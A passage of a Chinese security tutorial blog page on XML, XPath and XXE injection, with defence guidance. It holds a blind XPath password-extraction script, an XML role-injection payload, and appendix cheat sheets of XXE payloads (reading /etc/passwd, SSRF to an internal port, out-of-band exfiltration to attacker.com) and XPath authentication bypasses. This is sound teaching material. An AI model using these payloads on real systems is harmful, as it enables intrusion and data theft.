逐字符猜解节点值</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&quot;http://target.com/login&quot;</span></span><br><span class="line">CHARSET = string.ascii_lowercase + string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_xpath</span>(<span class="params">position, char</span>):</span><br><span class="line">    payload = <span class="string">f&quot;&#x27; and substring(//user[1]/password/text(),<span class="subst">&#123;position&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27; and &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>&#125;</span><br><span class="line">    r = requests.post(TARGET, data=data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text  <span class="comment"># 根据实际响应调整</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> CHARSET:</span><br><span class="line">        <span class="keyword">if</span> blind_xpath(pos, c):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 第<span class="subst">&#123;pos&#125;</span>位: <span class="subst">&#123;c&#125;</span> → 当前: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 第<span class="subst">&#123;pos&#125;</span>位未找到，结束&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[✓] 密码: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="第4章-XML-注入"><a href="#第4章-XML-注入" class="headerlink" title="第4章 XML 注入"></a>第4章 XML 注入</h2><h3 id="4-1-什么是-XML-注入"><a href="#4-1-什么是-XML-注入" class="headerlink" title="4.1 什么是 XML 注入"></a>4.1 什么是 XML 注入</h3><p>XML 注入是指攻击者通过输入特殊字符（<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code> 等）破坏 XML 结构，插入恶意标签或修改 XML 数据。</p>
+<h3 id="4-2-场景：XML-数据拼接"><a href="#4-2-场景：XML-数据拼接" class="headerlink" title="4.2 场景：XML 数据拼接"></a>4.2 场景：XML 数据拼接</h3><p><strong>漏洞代码</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];  <span class="comment">// 用户输入未转义</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="string">&quot;&lt;user&gt;&lt;name&gt;<span class="subst">$name</span>&lt;/name&gt;&lt;role&gt;guest&lt;/role&gt;&lt;/user&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;users.xml&quot;</span>, <span class="variable">$xml</span>, FILE_APPEND);</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击者输入</strong>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">role</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">role</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>解析后的 XML</strong>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">role</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">role</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功将自己的角色提权为 admin。</p>
+<h3 id="4-3-XML-注入-vs-XPath-注入"><a href="#4-3-XML-注入-vs-XPath-注入" class="headerlink" title="4.3 XML 注入 vs XPath 注入"></a>4.3 XML 注入 vs XPath 注入</h3><table>
+<thead>
+<tr>
+<th>漏洞</th>
+<th>攻击目标</th>
+<th>利用方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>XML 注入</td>
+<td>破坏&#x2F;篡改 XML 结构</td>
+<td>插入标签和属性</td>
+</tr>
+<tr>
+<td>XPath 注入</td>
+<td>篡改查询逻辑</td>
+<td>注入 XPath 语法</td>
+</tr>
+<tr>
+<td>XXE</td>
+<td>读取文件&#x2F;SSRF</td>
+<td>注入外部实体定义</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="第5章-防御与修复"><a href="#第5章-防御与修复" class="headerlink" title="第5章 防御与修复"></a>第5章 防御与修复</h2><h3 id="5-1-XXE-防御"><a href="#5-1-XXE-防御" class="headerlink" title="5.1 XXE 防御"></a>5.1 XXE 防御</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 彻底禁用外部实体</span></span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 或者禁用外部通用实体</span></span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 禁用外部参数实体</span></span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="Python（lxml）"><a href="#Python（lxml）" class="headerlink" title="Python（lxml）"></a>Python（lxml）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">parser = etree.XMLParser(resolve_entities=<span class="literal">False</span>, no_network=<span class="literal">True</span>)</span><br><span class="line">tree = etree.fromstring(xml_data, parser)</span><br></pre></td></tr></table></figure>
+
+<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="comment">// ↑ 这两个标志恰恰是开启外部实体的，去掉即可</span></span><br><span class="line"><span class="comment">// 推荐：</span></span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xml</span>, LIBXML_NONET);  <span class="comment">// 禁止网络访问</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Python（defusedxml）"><a href="#Python（defusedxml）" class="headerlink" title="Python（defusedxml）"></a>Python（defusedxml）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># defusedxml 是最安全的方案</span></span><br><span class="line"><span class="keyword">from</span> defusedxml <span class="keyword">import</span> minidom, sax, ElementTree</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换所有标准库 XML 解析器</span></span><br><span class="line">minidom.parseString(xml_data)</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-XPath-注入防御"><a href="#5-2-XPath-注入防御" class="headerlink" title="5.2 XPath 注入防御"></a>5.2 XPath 注入防御</h3><h4 id="参数化查询"><a href="#参数化查询" class="headerlink" title="参数化查询"></a>参数化查询</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 危险：字符串拼接</span></span><br><span class="line"><span class="variable">$xpath</span> = <span class="string">&quot;/users/user[name=&#x27;<span class="subst">$name</span>&#x27;]/password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 安全：预编译表达式 + 参数绑定</span></span><br><span class="line"><span class="variable">$xpath</span> = <span class="keyword">new</span> <span class="title class_">DOMXPath</span>(<span class="variable">$doc</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$xpath</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;/users/user[name=:name]/password&quot;</span>);</span><br><span class="line"><span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只允许字母数字</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-XML-注入防御"><a href="#5-3-XML-注入防御" class="headerlink" title="5.3 XML 注入防御"></a>5.3 XML 注入防御</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转义 XML 特殊字符</span></span><br><span class="line"><span class="variable">$safe_name</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$name</span>, ENT_XML1 | ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="variable">$safe_name</span> = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">    [<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>],</span><br><span class="line">    [<span class="string">&#x27;&amp;amp;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>, <span class="string">&#x27;&amp;apos;&#x27;</span>],</span><br><span class="line">    <span class="variable">$name</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-安全配置对照表"><a href="#5-4-安全配置对照表" class="headerlink" title="5.4 安全配置对照表"></a>5.4 安全配置对照表</h3><table>
+<thead>
+<tr>
+<th>配置</th>
+<th>风险</th>
+<th>推荐</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>禁用 DOCTYPE</td>
+<td>阻止所有 DTD 相关攻击</td>
+<td>✅ 默认开启</td>
+</tr>
+<tr>
+<td>禁用外部实体</td>
+<td>阻止文件读取</td>
+<td>✅ 默认开启</td>
+</tr>
+<tr>
+<td>禁用参数实体</td>
+<td>阻止 OOB XXE</td>
+<td>✅ 默认开启</td>
+</tr>
+<tr>
+<td>禁用外部 DTD</td>
+<td>阻止远程 DTD 加载</td>
+<td>✅ 生产环境</td>
+</tr>
+<tr>
+<td>禁用 XInclude</td>
+<td>阻止 XInclude 攻击</td>
+<td>✅ 默认关闭</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="A-XXE-Payload-速查"><a href="#A-XXE-Payload-速查" class="headerlink" title="A. XXE Payload 速查"></a>A. XXE Payload 速查</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 读文件 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 读 PHP 源码 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 读 Java Web 源码 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///WEB-INF/web.xml&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- SSRF 内网探测 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:6379/&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- OOB 外带（配合外部 DTD） --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>
+
+<h3 id="B-XPath-注入-Payload-速查"><a href="#B-XPath-注入-Payload-速查" class="headerlink" title="B. XPath 注入 Payload 速查"></a>B. XPath 注入 Payload 速查</h3><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>                   绕过认证</span><br><span class="line"><span class="string">&#x27; or true() or &#x27;</span>              绕过认证</span><br><span class="line"><span class="string">&#x27; and 1=0 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>         布尔假</span><br><span class="line"><span class="string">&#x27; and 1=1 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>         布尔真</span><br><span class="line">admin<span class="string">&#x27; and string-length(//user[1]/password/text())&gt;8 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  测长度</span><br><span class="line">admin<span class="string">&#x27; and substring(//user[1]/password/text(),1,1)=&#x27;</span>a<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  逐字符猜</span><br></pre></td></tr></table></figure>
+
+<h3 id="C-常见的-XML-解析器默认配置风险"><a href="#C-常见的-XML-解析器默认配置风险" class="headerlink" title="C. 常见的 XML 解析器默认配置风险"></a>C. 常见的 XML 解析器默认配置风险</h3><table>
+<thead>
+<tr>
+<th>语言&#x2F;库</th>
+<th>默认是否解析实体</th>
+<th>默认是否网络访问</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP SimpleXML</td>
+<td>✅ 是</td>
+<td>✅ 是</td>
+</tr>
+<tr>
+<td>Java DOM</td>
+<td>❌ 否</td>
+<td>❌ 否</td>
+</tr>
+<tr>
+<td>Python xml.etree</td>
+<td>✅ 是</td>
+<td>❌ 否</td>
+</tr>
+<tr>
+<td>Python lxml</td>
+<td>❌ 否</td>
+<td>❌ 否</td>
+</tr>
+<tr>
+<td>C# XmlDocument</td>
+<td>✅ 是</td>
+<td>✅ 是</td>
+</tr>
+<tr>
+<td>libxml2</td>
+<td>✅ 是</td>
+<td>✅ 是</td>
+</tr>
+</tbody></table>
+
+    </div>
+  </article>
+</section>
+
+  </main>
+
+  <!-- 页脚 -->
+  <footer>
+    <div class="footer-logo">My Blog</div>
+    <p>© 2026 ilovewxl</p>
+  </footer>
+
+  <script>
+    // 星空粒子
+    const c = document.getElementById('stars-canvas'), ctx = c.getContext('2d');
+    let stars = [];
+    function rs() { c.width = innerWidth; c.height = innerHeight; }
+    rs(); addEventListener('resize', rs);
+    for (let i = 200; i--;) stars.push({x:Math.random()*c.width,y:Math.random()*c.height,r:Math.random()*1.8+0.3,a:Math.random(),s:Math.random()*0.008+0.003});
+    function dr() { ctx.clearRect(0,0,c.width,c.height); for (const st of stars) { st.a+=st.s; const o=(Math.sin(st.a)+1)/2*0.6+0.1; ctx.beginPath(); ctx.arc(st.x,st.y,st.r,0,Math.PI*2); ctx.fillStyle=`rgba(240,245,242,${o})`; ctx.fill(); } requestAnimationFrame(dr); }
+    dr();
+    // 花瓣
+    const pc = document.getElementById('petalContainer');
+    for (let i = 20; i--;) { const p=document.createElement('div'); p.className='petal'; p.style.left=Math.random()*100+'%'; p.style.animationDuration=(Math.random()*10+14)+'s'; p.style.animationDelay=Math.random()*20+'s'; p.style.width=(Math.random()*10+10)+'px'; p.style.height=p.style.width; pc.appendChild(p); }
+    // 导航滚动
+    addEventListener('scroll',()=>document.getElementById('navbar').classList.toggle('scrolled',scrollY>60));
+  </script>
+</body>
+</html>
